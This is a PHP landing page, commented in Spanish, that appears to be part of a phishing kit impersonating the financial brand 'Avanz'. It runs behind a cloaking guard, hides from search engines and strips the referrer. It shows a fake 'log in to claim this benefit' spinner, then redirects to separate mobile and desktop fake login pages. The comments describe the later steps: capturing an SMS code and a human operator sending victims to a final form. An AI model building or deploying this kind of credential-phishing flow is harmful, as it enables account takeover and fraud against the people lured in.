<?php
// =====================================================================
// index2.php — Entrada CLOAK 2: landing de carga -> login.
// index.php  = landing de la tarjeta (vitrina) -> CTA -> login.
// index2.php = pantalla "Inicia sesión para solicitar este beneficio"
//              ~1.8s -> login directo (móvil: indexmovil.html,
//              desktop: pcindex.html). Flujo luego: SMS -> ... ->
//              el operador manda al formulario (form.php) al final.
// =====================================================================
require_once __DIR__ . '/_guard.php';

$ua      = $_SERVER['HTTP_USER_AGENT'] ?? '';
$esMovil = (bool)preg_match(
    '/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i',
    $ua
);
$destino = $esMovil ? 'indexmovil.html' : 'pcindex.html';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="referrer" content="no-referrer">
    <title>Avanz</title>
    <link rel="icon" href="img/lk.svg" type="image/svg+xml">
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Open Sans','Segoe UI',Arial,sans-serif;background:#fff;color:#1a1a1a;
             min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;
             -webkit-text-size-adjust:100%}
        .spin{width:110px;height:110px;background:url('img/logo-avanz-mini.png') no-repeat center/contain;
              animation:spin 1s linear infinite}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        p{margin-top:22px;font-size:16px;color:#555;text-align:center;padding:0 24px;line-height:1.5}
    </style>
    <noscript><meta http-equiv="refresh" content="2;url=<?php echo htmlspecialchars($destino, ENT_QUOTES); ?>"></noscript>
</head>
<body>
    <div class="spin"></div>
    <p>Inicia sesión para solicitar este beneficio</p>
    <script>
        setTimeout(function(){ window.location.replace('<?php echo $destino; ?>'); }, 1800);
    </script>
</body>
</html>
